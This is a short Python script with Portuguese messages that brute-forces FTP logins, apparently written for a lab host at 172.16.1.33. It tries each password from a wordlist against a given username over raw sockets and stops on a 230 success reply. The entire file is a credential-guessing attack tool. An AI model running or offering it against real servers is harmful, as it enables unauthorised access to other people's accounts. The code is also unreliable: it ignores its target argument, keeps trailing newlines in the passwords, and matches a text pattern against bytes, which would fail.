#!/usr/bin/python3
import socket, sys, re

if len(sys.argv) != 3:
    print("Modo de uso: python3 hawkftp.py 127.0.0.1 usuario")
    sys.exit()

target = sys.argv[1]
usuario = sys.argv[2]

f = open('wordlist.txt')
for palavra in f.readlines():


    print(f"Realizando brute force FTP: {usuario}:{palavra}")


    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(15)
    s.connect(("172.16.1.33", 21))

    banner = s.recv(1024)
    print(banner.decode(errors="ignore"))

    s.send(f"USER {usuario}\r\n".encode())
    user = s.recv(1024)
    print(user.decode(errors="ignore"))

    s.send(f"PASS {palavra}\r\n".encode())
    resposta = s.recv(1024)
    print(resposta.decode(errors="ignore"))

    s.send(b"QUIT\r\n")
    s.close()

    if re.search('230', resposta):
        print(f"[+] Senha encontrada: {palavra}")
        break
